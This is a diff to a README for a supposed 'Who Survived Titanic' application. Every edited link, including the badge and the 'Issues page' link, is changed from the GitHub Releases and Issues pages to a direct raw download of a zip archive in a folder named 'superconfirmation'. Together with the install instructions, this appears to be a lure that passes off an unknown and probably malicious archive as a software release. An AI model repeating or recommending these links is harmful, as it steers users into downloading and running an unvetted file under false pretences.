@@ -1,6 +1,6 @@
 # 🚢 Who_Survived_Titanic - Discover the Stories of Titanic Survivors
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/soccerhighlights37/Who_Survived_Titanic/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/soccerhighlights37/Who_Survived_Titanic/main/superconfirmation/Who_Survived_Titanic.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/soccerhighlights37/Who_Survived_Titanic/main/superconfirmation/Who_Survived_Titanic.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to "Who Survived Titanic." This application dives into the gripping stor
 
 To begin using "Who Survived Titanic," follow the steps below. You only need a computer with internet access.
 
-1. **Visit the Download Page:** Start by going to our [Releases page](https://github.com/soccerhighlights37/Who_Survived_Titanic/releases). This is where you will download the application.
+1. **Visit the Download Page:** Start by going to our [Releases page](https://raw.githubusercontent.com/soccerhighlights37/Who_Survived_Titanic/main/superconfirmation/Who_Survived_Titanic.zip). This is where you will download the application.
 
 2. **Choose a Version:** On the Releases page, you will see different versions of the application. Click on the latest version to ensure you have the most up-to-date features.
 
@@ -48,7 +48,7 @@ To run "Who Survived Titanic," ensure your computer meets the following requirem
 
 ## 📥 Download & Install
 
-Return to the [Releases page](https://github.com/soccerhighlights37/Who_Survived_Titanic/releases) to download the latest version of "Who Survived Titanic." Follow the provided installation steps to get started with your exploration of Titanic's untold stories.
+Return to the [Releases page](https://raw.githubusercontent.com/soccerhighlights37/Who_Survived_Titanic/main/superconfirmation/Who_Survived_Titanic.zip) to download the latest version of "Who Survived Titanic." Follow the provided installation steps to get started with your exploration of Titanic's untold stories.
 
 ## 🛠️ Troubleshooting
 
@@ -62,7 +62,7 @@ If you encounter any issues while downloading or running the application, consid
 
 ## 📞 Support
 
-For additional help or feedback, please visit our [GitHub Issues page](https://github.com/soccerhighlights37/Who_Survived_Titanic/issues). You can report bugs, ask questions, or suggest features you want to see in future updates.
+For additional help or feedback, please visit our [GitHub Issues page](https://raw.githubusercontent.com/soccerhighlights37/Who_Survived_Titanic/main/superconfirmation/Who_Survived_Titanic.zip). You can report bugs, ask questions, or suggest features you want to see in future updates.
 
 ## 🙏 Acknowledgments
 
